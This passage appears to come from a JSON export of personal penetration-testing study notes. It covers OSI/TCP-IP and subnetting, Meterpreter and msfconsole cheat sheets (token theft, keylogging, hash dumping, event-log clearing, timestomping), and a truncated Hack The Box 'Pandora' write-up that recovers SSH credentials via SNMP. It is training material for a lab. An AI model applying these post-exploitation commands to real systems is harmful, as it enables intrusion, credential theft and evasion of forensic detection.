goal in defining the `ISO/OSI` standard was to create a reference model that enables the communication of different technical systems via various devices and technologies and provides compatibility. The `OSI` model uses `seven` different layers, which are hierarchically based on each other to achieve this goal. These layers represent phases in the establishment of each connection through which the sent packets pass. In this way, the standard was created to trace how a connection is structured and established visually.\n\n| **Layer** | **Function** |\n| --- | --- |\n| `7.Application` | Among other things, this layer controls the input and output of data and provides the application functions. |\n| `6.Presentation` | The presentation layer's task is to transfer the system-dependent presentation of data into a form independent of the application. |\n| `5.Session` | The session layer controls the logical connection between two systems and prevents, for example, connection breakdowns or other problems. |\n| `4.Transport` | Layer 4 is used for end-to-end control of the transferred data. The Transport Layer can detect and avoid congestion situations and segment data streams. |\n| `3.Network` | On the networking layer, connections are established in circuit-switched networks, and data packets are forwarded in packet-switched networks. Data is transmitted over the entire network from the sender to the receiver. |\n| `2.Data Link` | The central task of layer 2 is to enable reliable and error-free transmissions on the respective medium. For this purpose, the bitstreams from layer 1 are divided into blocks or frames. |\n| `1.Physical` | The transmission techniques used are, for example, electrical signals, optical signals, or electromagnetic waves. Through layer 1, the transmission takes place on wired or wireless transmission lines. |\n\nThe layers `2-4` are `transport oriented`, and the layers `5-7` are `application oriented` layers. In each layer, precisely defined tasks are performed, and the interfaces to the neighbouring layers are precisely described. Each layer offers services for use to the layer directly above it. To make these services available, the layer uses the services of the layer below it and performs the tasks of its layer.\n\nIf two systems communicate, all seven layers of the `OSI` model are run through at least `twice`, since both the sender and the receiver must take the layer model into account. Therefore, a large number of different tasks must be performed in the individual layers to ensure the communication's security, reliability, and performance.\n\nWhen an application sends a packet to the other system, the system works the layers shown above from layer `7` down to layer `1`, and the receiving system unpacks the received packet from layer `1` up to layer `7`.\n\n### The TCP/IP Model\n`TCP/IP` (`Transmission Control Protocol`/`Internet Protocol`) is a generic term for many network protocols. The protocols are responsible for the switching and transport of data packets on the Internet. The Internet is entirely based on the `TCP/IP` protocol family. However, `TCP/IP` does not only refer to these two protocols but is usually used as a generic term for an entire protocol family.\n\nFor example, `ICMP` (`Internet Control Message Protocol`) or `UDP` (`User Datagram Protocol`) belongs to the protocol family. The protocol family provides the necessary functions for transporting and switching data packets in a private or public network.\n\nThe most important tasks of `TCP/IP` are:\n\n| **Task** | **Protocol** | **Description** |\n| --- | --- | --- |\n| `Logical Addressing` | `IP` | Due to many hosts in different networks, there is a need to structure the network topology and logical addressing. Within TCP/IP, IP takes over the logical addressing of networks and nodes. Data packets only reach the network where they are supposed to be. The methods to do so are `network classes`, `subnetting`, and `CIDR`. |\n| `Routing` | `IP` | For each data packet, the next node is determined in each node on the way from the sender to the receiver. This way, a data packet is routed to its receiver, even if its location is unknown to the sender. |\n| `Error \u0026 Control Flow` | `TCP` | The sender and receiver are frequently in touch with each other via a virtual connection. Therefore control messages are sent continuously to check if the connection is still established. |\n| `Application Support` | `TCP` | TCP and UDP ports form a software abstraction to distinguish specific applications and their communication links. |\n| `Name Resolution` | `DNS` | DNS provides name resolution through Fully Qualified Domain Names (FQDN) in IP addresses, enabling us to reach the desired host with the specified name on the internet. |\n\n### ISO/OSI vs. TCP/IP\n`TCP/IP` is a communication protocol that allows hosts to connect to the Internet. It refers to the `Transmission Control Protocol` used in and by applications on the Internet. In contrast to `OSI`, it allows a lightening of the rules that must be followed, provided that general guidelines are followed.\n\n`OSI`, on the other hand, is a communication gateway between the network and end-users. The OSI model is usually referred to as the reference model because it is older. It is also known for its strict protocol and limitations.\n\n## Packet Transfers\nIn a layered system, devices in a layer exchange data in a different format called a `protocol data unit` (`PDU`). For example, when we want to browse a website on the computer, the remote server software first passes the requested data to the application layer. It is processed layer by layer, each layer performing its assigned functions. The data is then transferred through the network's physical layer until the destination server or another device receives it. The data is routed through the layers again, with each layer performing its assigned operations until the receiving software uses the data.\n\n![image](https://academy.hackthebox.com/storage/modules/34/redesigned/net_models_pdu2.png)\n\nDuring the transmission, each layer adds a `header` to the `PDU` from the upper layer, which controls and identifies the packet. This process is called `encapsulation`. The header and the data together form the PDU for the next layer. The process continues to the `Physical Layer` or `Network Layer`, where the data is transmitted to the receiver. The receiver reverses the process and unpacks the data on each layer with the header information. After that, the application finally uses the data. This process continues until all data has been sent and received.\n\n![image](https://academy.hackthebox.com/storage/modules/34/packet_transfer.png)\n\nFor us, as penetration testers, both reference models are useful. With `TCP/IP`, we can quickly understand how the entire connection is established, and with `ISO`, we can take it apart piece by piece and analyse it in detail. This often happens when we can listen to and intercept specific network traffic. We then have to analyse this traffic accordingly, going into more detail in the `Network Traffic Analysis` module. Therefore, we should familiarise ourselves with both reference models and understand and internalise them in the best possible way.\n\n## Subnetting\nThe division of an address range of IPv4 addresses into several smaller address ranges is called `subnetting`.\n\nA subnet is a logical segment of a network that uses IP addresses with the same network address. We can think of a subnet as a labeled entrance on a large building corridor. For example, this could be a glass door that separates various departments of a company building. With the help of subnetting, we can create a specific subnet by ourselves or find out the following outline of the respective network:\n\n-   `Network address`\n-   `Broadcast address`\n-   `First host`\n-   `Last host`\n-   `Number of hosts`\n\nLet us take the following IPv4 address and subnet mask as an example:\n\n-   IPv4 Address: `192.168.12.160`\n-   Subnet Mask: `255.255.255.192`\n-   CIDR: `192.168.12.160/26`\n\nWe already know that an IP address is divided into the `network part` and the `host part`.\n\n#### Network Part\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | `1100 0000` | `1010 1000` | `0000 1100` | `10`10 0000 | 192.168.12.160`/26` |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `11`00 0000 | `255.255.255.192` |\n| Bits | /8 | /16 | /24 | /32 |  |\n\nIn subnetting, we use the subnet mask as a template for the IPv4 address. From the `1`\\-bits in the subnet mask, we know which bits in the IPv4 address `cannot` be changed. These are `fixed` and therefore determine the \"main network\" in which the subnet is located.\n\n#### Host Part\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 10`10 0000` | 192.168.12.160/26 |\n| Subnet mask | 1111 1111 | 1111 1111 | 1111 1111 | 11`00 0000` | 255.255.255.192 |\n| Bits | /8 | /16 | /24 | /32 |  |\n\nThe bits in the `host part` can be changed to the `first` and `last` address. The first address is the `network address`, and the last address is the `broadcast address` for the respective subnet.\n\nThe `network address` is vital for the delivery of a data packet. If the `network address` is the same for the source and destination address, the data packet is delivered within the same subnet. If the network addresses are different, the data packet must be routed to another subnet via the `default gateway`.\n\nThe `subnet mask` determines where this separation occurs.\n\n#### Separation Of Network \u0026 Host Parts\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 10`|`10 0000 | 192.168.12.160/26 |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `11|`00 0000 | 255.255.255.192 |\n| Bits | /8 | /16 | /24 | /32 |  |\n\n#### Network Address\n\nSo if we now set all bits to `0` in the `host part` of the IPv4 address, we get the respective subnet's `network address`.\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 10`|00 0000` | `192.168.12.128`/26 |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `11|`00 0000 | 255.255.255.192 |\n| Bits | /8 | /16 | /24 | /32 |  |\n\n#### Broadcast Address\n\nIf we set all bits in the `host part` of the IPv4 address to `1`, we get the `broadcast address`.\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 10`|11 1111` | `192.168.12.191`/26 |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `11|`00 0000 | 255.255.255.192 |\n| Bits | /8 | /16 | /24 | /32 |  |\n\nSince we now know that the IPv4 addresses `192.168.12.128` and `192.168.12.191` are assigned, all other IPv4 addresses are accordingly between `192.168.12.129-190`. Now we know that this subnet offers us a total of `64 - 2` (network address \u0026 broadcast address) or `62` IPv4 addresses that we can assign to our hosts.\n\n| **Hosts** | **IPv4** |\n| --- | --- |\n| Network Address | `192.168.12.128` |\n| First Host | `192.168.12.129` |\n| Other Hosts | `...` |\n| Last Host | `192.168.12.190` |\n| Broadcast Address | `192.168.12.191` |\n\n## Subnetting Into Smaller Networks\nLet us now assume that we, as administrators, have been given the task of dividing the subnet assigned to us into 4 additional subnets. Thus, it is essential to know that we can only divide the subnets based on the binary system.\n\n| **Exponent** | **Value** |\n| --- | --- |\n| 2`^0` | \\= 1 |\n| 2`^1` | \\= 2 |\n| 2`^2` | \\= 4 |\n| 2`^3` | \\= 8 |\n| 2`^4` | \\= 16 |\n| 2`^5` | \\= 32 |\n| 2`^6` | \\= 64 |\n| 2`^7` | \\= 128 |\n| 2`^8` | \\= 256 |\n\n___\n\nTherefore we can divide the `64 hosts` we know by `4`. The `4` is equal to the exponent 2`^2` in the binary system, so we find out the number of bits for the subnet mask by which we have to extend it. So we know the following parameters:\n\n-   Subnet: `192.168.12.128/26`\n-   Required Subnets: `4`\n\nNow we increase/expand our subnet mask by `2 bits` from `/26` to `/28`, and it looks like this:\n\n| **Details of** | **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** | **Decimal** |\n| --- | --- | --- | --- | --- | --- |\n| IPv4 | 1100 0000 | 1010 1000 | 0000 1100 | 1000`|` 0000 | 192.168.12.128`/28` |\n| Subnet mask | `1111 1111` | `1111 1111` | `1111 1111` | `1111|` 0000 | `255.255.255.240` |\n| Bits | /8 | /16 | /24 | /32 |  |\n\nNext, we can divide the `64` IPv4 addresses that are available to us into `4 parts`:\n\n| **Hosts** | **Math** | **Subnets** | **Host range for each subnet** |\n| --- | --- | --- | --- |\n| 64 | / | 4 | \\= `16` |\n\nSo we know how big each subnet will be. From now on, we start from the network address given to us (192.168.12.128) and add the `16` hosts `4` times:\n\n| **Subnet No.** | **Network Address** | **First Host** | **Last Host** | **Broadcast Address** | **CIDR** |\n| --- | --- | --- | --- | --- | --- |\n| 1 | `192.168.12.128` | 192.168.12.129 | 192.168.12.142 | `192.168.12.143` | 192.168.12.128/28 |\n| 2 | `192.168.12.144` | 192.168.12.145 | 192.168.12.158 | `192.168.12.159` | 192.168.12.144/28 |\n| 3 | `192.168.12.160` | 192.168.12.161 | 192.168.12.174 | `192.168.12.175` | 192.168.12.160/28 |\n| 4 | `192.168.12.176` | 192.168.12.177 | 192.168.12.190 | `192.168.12.191` | 192.168.12.176/28 |\n\n## Mental Subnetting\nIt may seem like there is a lot of math involved in subnetting, but each octet repeats itself, and everything is a power of two, so there doesn't have to be a lot of memorization. The first thing to do is identify what octet changes.\n\n| **1st Octet** | **2nd Octet** | **3rd Octet** | **4th Octet** |\n| --- | --- | --- | --- |\n| /8 | /16 | /24 | /32 |\n\nIt is possible to identify what octet of the IP Address may change by remembering those four numbers. Given the Network Address: `192.168.1.1/25`, it is immediately apparent that 192.168.2.4 would not be in the same network because the `/25` subnet means only the fourth octet may change.\n\nThe next part identifies how big each subnet can be but by dividing eight by the network and looking at the `remainder`. This is also called `Modulo Operation (%)` and is heavily utilized in cryptology. Given our previous example of `/25`, `(25 % 8)` would be 1. This is because eight goes into 25 three times (8 \\* 3 = 24). There is a 1 leftover, which is the network bit reserved for the network mask. There is a total of eight bits in each octet of an IP Address. If one is used for the network mask, the equation becomes 2^(8-1) or 2^7, 128. The table below contains all the numbers.\n\n| **Remainder** | **Number** | **Exponential Form** | **Division Form** |\n| --- | --- | --- | --- |\n| 0 | 256 | 2^8 | 256 |\n| 1 | 128 | 2^7 | 256/2 |\n| 2 | 64 | 2^6 | 256/2/2 |\n| 3 | 32 | 2^5 | 256/2/2/2 |\n| 4 | 16 | 2^4 | 256/2/2/2/2 |\n| 5 | 8 | 2^3 | 256/2/2/2/2/2 |\n| 6 | 4 | 2^2 | 256/2/2/2/2/2/2 |\n| 7 | 2 | 2^1 | 256/2/2/2/2/2/2/2 |\n\nBy remembering the powers of two up to eight, it can become an instant calculation. However, if forgotten, it may be quicker to remember to divide 256 in half the number of times of the remainder.\n\nThe tricky part of this is getting the actual IP Address range because 0 is a number and not null in networking. So in our `/25` with 128 IP Addresses, the first range is `192.168.1.0-127`. The first address is the network, and the last is the broadcast address, which means the usable IP Space would become `192.168.1.1-126`. If our IP Address fell above 128, then the `usable ip space` would be 192.168.129-254 (128IPs the network and 255 is the broadcast).\n\n",
    "lastmodified": "2022-11-24T12:20:59.455798626Z",
    "tags": null
  },
  "/notes/general/htb-meterpreter-cheatsheet": {
    "title": "Meterpreter",
    "content": "# Meterpreter\n| **Command**                                                     | **Description**                                                  |\n| :---------------------------------------------------------- | :----------------------------------------------------------- |\n| `help`                                                      | Open Meterpreter usage help.                                 |\n| `run \u003cscriptname\u003e`                                        | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory. |\n| `sysinfo`                                                   | Show the system information on the compromised target.       |\n| `ls`                                                        | List the files and folders on the target.                    |\n| `use priv`                                                  | Load the privilege extension for extended Meterpreter libraries. |\n| `ps`                                                        | Show all running processes and which accounts are associated with each process. |\n| `migrate \u003cproc. id\u003e`                                      | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |\n| `use incognito`                                             | Load incognito functions. (Used for token stealing and impersonation on a target machine.) |\n| `list_tokens -u`                                            | List available tokens on the target by user.                 |\n| `list_tokens -g`                                            | List available tokens on the target by group.                |\n| `impersonate_token \u003cDOMAIN_NAMEUSERNAME\u003e`               | Impersonate a token available on the target.                 |\n| `steal_token \u003cproc. id\u003e`                                  | Steal the tokens available for a given process and impersonate that token. |\n| `drop_token`                                                | Stop impersonating the current token.                        |\n| `getsystem`                                                 | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors. |\n| `shell`                                                     | Drop into an interactive shell with all available tokens.    |\n| `execute -f \u003ccmd.exe\u003e -i`                                 | Execute cmd.exe and interact with it.                        |\n| `execute -f \u003ccmd.exe\u003e -i -t`                              | Execute cmd.exe with all available tokens.                   |\n| `execute -f \u003ccmd.exe\u003e -i -H -t`                           | Execute cmd.exe with all available tokens and make it a hidden process. |\n| `rev2self`                                                  | Revert back to the original user you used to compromise the target. |\n| `reg \u003ccommand\u003e`                                           | Interact, create, delete, query, set, and much more in the target’s registry. |\n| `setdesktop \u003cnumber\u003e`                                     | Switch to a different screen based on who is logged in.      |\n| `screenshot`                                                | Take a screenshot of the target’s screen.                    |\n| `upload \u003cfilename\u003e`                                       | Upload a file to the target.                                 |\n| `download \u003cfilename\u003e`                                     | Download a file from the target.                             |\n| `keyscan_start`                                             | Start sniffing keystrokes on the remote target.              |\n| `keyscan_dump`                                              | Dump the remote keys captured on the target.                 |\n| `keyscan_stop`                                              | Stop sniffing keystrokes on the remote target.               |\n| `getprivs`                                                  | Get as many privileges as possible on the target.            |\n| `uictl enable \u003ckeyboard/mouse\u003e`                           | Take control of the keyboard and/or mouse.                   |\n| `background`                                                | Run your current Meterpreter shell in the background.        |\n| `hashdump`                                                  | Dump all hashes on the target. use sniffer Load the sniffer module. |\n| `sniffer_interfaces`                                        | List the available interfaces on the target.                 |\n| `sniffer_dump \u003cinterfaceID\u003e pcapname`                     | Start sniffing on the remote target.                         |\n| `sniffer_start \u003cinterfaceID\u003e packet-buffer`               | Start sniffing with a specific range for a packet buffer.    |\n| `sniffer_stats \u003cinterfaceID\u003e`                             | Grab statistical information from the interface you are sniffing. |\n| `sniffer_stop \u003cinterfaceID\u003e`                              | Stop the sniffer.                                            |\n| `add_user \u003cusername\u003e \u003cpassword\u003e -h \u003cip\u003e`              | Add a user on the remote target.                             |\n| `add_group_user \u003c\"Domain Admins\"\u003e \u003cusername\u003e -h \u003cip\u003e` | Add a username to the Domain Administrators group on the remote target. |\n| `clearev`                                                   | Clear the event log on the target machine.                   |\n| `timestomp`                                                 | Change file attributes, such as creation date (antiforensics measure). |\n| `reboot`                                                    | Reboot the target machine.                                   |\n|                                                             |                                                              |",
    "lastmodified": "2022-11-24T12:20:59.475701332Z",
    "tags": null
  },
  "/notes/general/htb-msfconsole-cheatsheet": {
    "title": "MSFConsole Cheatsheet",
    "content": "# MSFConsole Cheatsheet\n| **Command**        | **Description**                                                  |\n| :--------------- | :----------------------------------------------------------- |\n| `show exploits` | Show all exploits within the Framework.                      |\n| `show payloads`  | Show all payloads within the Framework.                      |\n| `show auxiliary` | Show all auxiliary modules within the Framework.             |\n| `search \u003cname\u003e` | Search for exploits or modules within the Framework.         |\n| `info`         | Load information about a specific exploit or module.         |\n| `use \u003cname\u003e` | Load an exploit or module (example: use windows/smb/psexec). |\n| `use \u003cnumber\u003e` | Load an exploit by using the index number displayed after the search \u003cname\u003e command. |\n| `LHOST`        | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |\n| `RHOST`        | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST). |\n| `setg \u003cfunction\u003e` | Set a specific value globally (for example, LHOST or RHOST). |\n| `show options` | Show the options available for a module or exploit.          |\n| `show targets` | Show the platforms supported by the exploit.                 |\n| `set target \u003cnumber\u003e` | Specify a specific target index if you know the OS and service pack. |\n| `set payload \u003cpayload\u003e` | Specify the payload to use. |\n| `set payload \u003cnumber\u003e` | Specify the payload index number to use after the show payloads command. |\n| `show advanced` | Show advanced options. |\n| `set autorunscript migrate -f` | Automatically migrate to a separate process upon exploit completion. |\n| `check` | Determine whether a target is vulnerable to an attack. |\n| `exploit` | Execute the module or exploit and attack the target. |\n| `exploit -j` | Run the exploit under the context of the job. (This will run the exploit in the background.) |\n| `exploit -z` | Do not interact with the session after successful exploitation. |\n| `exploit -e \u003cencoder\u003e` | Specify the payload encoder to use (example: exploit –e shikata_ga_nai). |\n| `exploit -h` | Display help for the exploit command. |\n| `sessions -l` | List available sessions (used when handling multiple shells). |\n| `sessions -l -v` | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system. |\n| `sessions -s \u003cscript\u003e` | Run a specific Meterpreter script on all Meterpreter live sessions. |\n| `sessions -K` | Kill all live sessions. |\n| `sessions -c \u003ccmd\u003e` | Execute a command on all live Meterpreter sessions. |\n| `sessions -u \u003csessionID\u003e` | Upgrade a normal Win32 shell to a Meterpreter console. |\n| `db_create \u003cname\u003e` | Create a database to use with database-driven attacks (example: db_create autopwn). |\n| `db_connect \u003cname\u003e` | Create and connect to a database for driven attacks (example: db_connect autopwn). |\n| `db_nmap` | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.) |\n| `db_destroy` | Delete the current database. |\n| `db_destroy  \u003cuser:password@host:port/database\u003e` | Delete database using advanced options. |\n|                |                                                              |",
    "lastmodified": "2022-11-24T12:20:59.600359678Z",
    "tags": null
  },
  "/notes/general/htb-pandora": {
    "title": "HTB - Pandora",
    "content": "# HTB - Pandora\n---\nWe first enumerate:\n\n```bash\nsudo nmap -sC -sV -oA pandora 10.10.11.136\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:02 BST\nNmap scan report for 10.10.11.136\nHost is up (0.034s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)\n|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)\n|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Play | Landing\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.58 secon\n```\n\nSo we have **Apache 2.4.41** on port 80 and **SSH** 8.2p1 on port 22, we are running Ubuntu.\n\nLet's add it to our localhost by editing `/etc/hosts`, adding `pandora.htb` and checking the website out.\n\nLet's try sending stuff using the form:\n\n![Screenshot from 2022-07-18 11-15-52](notes/images/Screenshot%20from%202022-07-18%2011-15-52.png)\n\nWe also set up a `nc -lnvp 80`, but didn't really receive anything.\n\nWe get the url `http://pandora.htb/?fullName=hanato\u0026email=hanato%40morioh.cool\u0026phone=%2B885+1234+3244+987\u0026message=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.12%2Ftest%22%3E%3C%2Fimg%3E%3Ca+href%3D%22http%3A%2F%2F10.10.14.12%2F%22%3Eclick+here%3C%2Fa%3E`.\n\nLet's gobust-it:\n\n```bash\ngobuster dir -u http://10.10.11.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.out\n```\n\nWe can look at the UDP ports I guess, it will take a while though (around 10min):\n\n```bash\nsudo nmap -sU 10.10.11.136 -v\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 11:41 BST\nInitiating Ping Scan at 11:41\nScanning 10.10.11.136 [4 ports]\nCompleted Ping Scan at 11:41, 0.03s elapsed (1 total hosts)\nInitiating UDP Scan at 11:41\nScanning pandora.htb (10.10.11.136) [1000 ports]\nIncreasing send delay for 10.10.11.136 from 0 to 50 due to max_successful_tryno increase to 4\nIncreasing send delay for 10.10.11.136 from 50 to 100 due to max_successful_tryno increase to 5\nIncreasing send delay for 10.10.11.136 from 100 to 200 due to max_successful_tryno increase to 6\nIncreasing send delay for 10.10.11.136 from 200 to 400 due to max_successful_tryno increase to 7\nIncreasing send delay for 10.10.11.136 from 400 to 800 due to max_successful_tryno increase to 8\nUDP Scan Timing: About 4.48% done; ETC: 11:52 (0:11:01 remaining)\nIncreasing send delay for 10.10.11.136 from 800 to 1000 due to 11 out of 27 dropped probes since last increase.\nUDP Scan Timing: About 7.41% done; ETC: 11:54 (0:12:42 remaining)\nUDP Scan Timing: About 25.33% done; ETC: 11:57 (0:11:59 remaining)\nUDP Scan Timing: About 31.03% done; ETC: 11:57 (0:11:09 remaining)\nUDP Scan Timing: About 36.83% done; ETC: 11:57 (0:10:19 remaining)\nUDP Scan Timing: About 42.55% done; ETC: 11:57 (0:09:28 remaining)\nUDP Scan Timing: About 48.17% done; ETC: 11:57 (0:08:38 remaining)\nUDP Scan Timing: About 53.27% done; ETC: 11:57 (0:07:47 remaining)\nUDP Scan Timing: About 58.48% done; ETC: 11:57 (0:06:56 remaining)\nUDP Scan Timing: About 63.58% done; ETC: 11:57 (0:06:05 remaining)\nDiscovered open port 161/udp on 10.10.11.136\n```\n\nWe got something in port **161** and according to [this](https://www.speedguide.net/port.php?port=161) it holds the `SNMP` service.\n\nWe can use `SNMPWalk` to collect SNMP information. SNMP (Simple Network Management Protocol) is a network monitoring protocol for seamless communication between multiple devices ona network, transmitting messages from the SNMP manager to the SNMP remote at each networking site (more [here](https://www.solarwinds.com/resources/it-glossary/snmp-walk)).\n\n```bash\nsnmpwalk -c public -v2c 10.10.11.136\n```\n\n- `-c`: set the community string (default is public).\n- `-v2c`: set version to 2c, which is the most common.\n\nIt takes ages so we use this instead:\n\n```bash\nsnmpbulkwalk -c public -v2c 10.10.11.136 . \u003e snmpwalk.1\n```\n\nWe can clean the file up:\n\n```bash\ngrep -oP '::.*?\\.\"' snmpwalk.1 | sort | uniq -c | sort -n\n```\n\nThen we can do:\n\n```bash\ngrep \u003csomething\u003e snmpwalk.1 | less -S\ngrep hrSWRun snmpwalk.1 | less -S\n```\n\nWe found this:\n\n```bash\nHOST-RESOURCES-MIB::hrSWRunParameters.823 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"\n\nHOST-RESOURCES-MIB::hrSWRunParameters.1117 = STRING: \"-u daniel -p HotelBabylon23\"\n```\n\nIt seems we a `daniel:HotelBabylon23` login:\n\n```bash\n~/htb/pandora \u003e grep hrSWRun snmpwalk.1 |grep 823                                                                                                                                                                                      1m 12s\nHOST-RESOURCES-MIB::hrSWRunIndex.823 = INTEGER: 823\nHOST-RESOURCES-MIB::hrSWRunName.823 = STRING: \"sh\"\nHOST-RESOURCES-MIB::hrSWRunID.823 = OID: SNMPv2-SMI::zeroDotZero\nHOST-RESOURCES-MIB::hrSWRunPath.823 = STRING: \"/bin/sh\"\nHOST-RESOURCES-MIB::hrSWRunParameters.823 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"\nHOST-RESOURCES-MIB::hrSWRunType.823 = INTEGER: application(4)\nHOST-RESOURCES-MIB::hrSWRunStatus.823 = INTEGER: runnable(2)\nHOST-RESOURCES-MIB::hrSWRunPerfCPU.823 = INTEGER: 0\nHOST-RESOURCES-MIB::hrSWRunPerfMem.823 = INTEGER: 604 KBytes\n\n~/htb/pandora \u003e grep hrSWRun snmpwalk.1 |grep 1117\nHOST-RESOURCES-MIB::hrSWRunIndex.1117 = INTEGER: 1117\nHOST-RESOURCES-MIB::hrSWRunName.1117 = STRING: \"host_check\"\nHOST-RESOURCES-MIB::hrSWRunID.1117 = OID: SNMPv2-SMI::zeroDotZero\nHOST-RESOURCES-MIB::hrSWRunPath.1117 = STRING: \"/usr/bin/host_check\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1117 = STRING: \"-u daniel -p HotelBabylon23\"\nHOST-RESOURCES-MIB::hrSWRunType.1117 = INTEGER: application(4)\nHOST-RESOURCES-MIB::hrSWRunStatus.1117 = INTEGER: runnable(2)\nHOST-RESOURCES-MIB::hrSWRunPerfCPU.1117 = INTEGER: 0\nHOST-RESOURCES-MIB::hrSWRunPerfMem.1117 = INTEGER: 1360 KBytes\n```\n\nWe ssh:\n\n```bash\n~/htb/pandora \u003e ssh daniel@10.10.11.136                                \nThe authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.\nECDSA key fingerprint is SHA256:9urFJN3aRYRRc9S5Zc+py/w4W6hmZ+WLg6CyrY+5MDI.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.136' (ECDSA) to the list of known hosts.\ndaniel@10.10.11.136's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 18 Jul 11:12:54 UTC 2022\n\n  System load:           0.09\n  Usage of /:            63.4% of 4.87GB\n  Memory usage:          8%\n  Swap usage:            0%\n  Processes:             231\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.136\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:f793\n\n  =\u003e /boot is using 91.8% of 219MB\n\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\ndaniel@pandora:~$\n```\n\nWe can look into the webserver, `/var/www`.\n\n```bash\ndaniel@pandora:/var/www/pandora/pandora_console$ find . | grep config.php\n```\n\nWe get permission denied when trying to access `config.php`, only matt seems to have access:\n\n```bash\ndaniel@pandora:/var/www/pandora/pandora_console/include$ ls -la config.php \n-rw------- 1 matt matt 413 Dec  3  2021 config.php\n```\n\nWe can check if matt is running anything with `ps -ef` but he is not. We can also check Apache:\n\n```bash\ndaniel@pandora:/var/www/pandora/pandora_console/include$ cd /etc/apache2/\ndaniel@pandora:/etc/apache2$ ls\napache2.conf  conf-available  conf-enabled  envvars  magic  mods-available  mods-enabled  ports.conf  sites-available  sites-enabled\ndaniel@pandora:/etc/apache2$ cd sites-enabled/\ndaniel@pandora:/etc/apache2/sites-enabled$ ls\n000-default.conf  pandora.conf\ndaniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf \n\u003cVirtualHost localhost:80\u003e\n  ServerAdmin admin@panda.htb\n  ServerName pandora.panda.htb\n  DocumentRoot /var/www/pandora\n  AssignUserID matt matt\n  \u003cDirectory /var/www/pandora\u003e\n    AllowOverride All\n  \u003c/Directory\u003e\n  ErrorLog /var/log/apache2/error.log\n  CustomLog /var/log/apache2/access.log combined\n\u003c/VirtualHost\u003e\n```\n\nWe can add the ServerName to `/etc/hosts` like so:\n\n```bash\n10.10.11.136  pandora.htb  pandora.panda.htb\n```\n\nNop, nothing changed. We type `~C` to go into a ssh menu and start listening. We can check if we are listening:\n\n```bash\nss -lnpt | grep 8000\n```\n\nAnd we are not, so we run:\n\n```bash\nssh\u003e -L 8000:127.0.0.1:80\nForwarding port.\n\n~/htb/pandora \u003e ss -lnpt | grep 8000                                                                                                                                                                                                  err 0|1\nLISTEN 0      128        127.0.0.1:8000      0.0.0.0:*    users:((\"ssh\",pid=161846,fd=8))\nLISTEN 0      128            [::1]:8000         [::]:*    users:((\"ssh\",pid=161846,fd=7)\n```\n\n- `-L`: local port forward.\n\nNow we can checkout: `http://localhost:8000`!\n\n![Screenshot from 2022-07-18 12-44-31](notes/images/Screenshot%20from%202022-07-18%2012-44-31.png)\n\nWe can now `searchploit Pandora 7`. They seem all to be authenticated, so we need a login.\n\nThere is 